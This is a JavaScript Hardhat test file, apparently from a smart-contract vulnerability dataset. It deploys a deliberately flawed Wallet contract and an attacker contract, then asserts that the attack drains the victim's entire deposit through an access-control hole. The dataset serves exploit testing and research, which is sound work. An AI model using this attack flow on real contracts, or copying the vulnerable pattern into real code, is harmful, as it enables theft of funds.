const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const path = require("path");
const fs = require("fs");

describe('attack access_control/wallet_02_refund_nosub.sol', function () {
    async function deployContracts() {
      const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/access_control/wallet_02_refund_nosub.sol/Wallet.json');
      const json = JSON.parse(fs.readFileSync(codePath));
      const Wallet = await ethers.getContractFactory(json.abi, json.bytecode);
      const victim = await Wallet.deploy();  
      await victim.waitForDeployment();
      const address = await victim.getAddress();

      const WalletAttacker = await ethers.getContractFactory('contracts/access_control/wallet_02_refund_nosub_attack.sol:WalletAttacker');
      const attacker = await WalletAttacker.deploy(address);  
      await attacker.waitForDeployment();
      return {victim, attacker};
    }

    it('sanity check: access_control/wallet_02_refund_nosub.sol', async function () {
      const {victim} = await loadFixture(deployContracts);
      await expect(victim.deposit({value: 1})).to.not.be.reverted;
      await expect(victim.withdraw(1)).to.not.be.reverted;
    });

  
    it('exploit access control vulnerability', async function () {
      const {victim, attacker} = await loadFixture(deployContracts);
      const [v, a] = await ethers.getSigners();
      const victim_addr = await victim.getAddress();
      const attacker_addr = await attacker.getAddress();
      const amount = ethers.parseEther("1.0");

      await victim.connect(v).deposit({value: amount});

      const smallerAmount = ethers.parseEther("0.1");
      await a.sendTransaction({
        to: attacker_addr,
        value: smallerAmount,
      });
      const victimBalanceBefore = await ethers.provider.getBalance(victim_addr);
      expect(victimBalanceBefore).to.equal(amount);
      const attackerBalanceBefore = await ethers.provider.getBalance(attacker_addr);
      expect(attackerBalanceBefore).to.equal(smallerAmount);
      
      const options = {value: smallerAmount};
      await attacker.attack(options);
      const victimBalanceAfter = await ethers.provider.getBalance(victim_addr);
      expect(victimBalanceAfter).to.equal(0);
      const attackerBalanceAfter = await ethers.provider.getBalance(attacker_addr);
      expect(attackerBalanceAfter - attackerBalanceBefore).to.equal(amount + smallerAmount);
    });
  });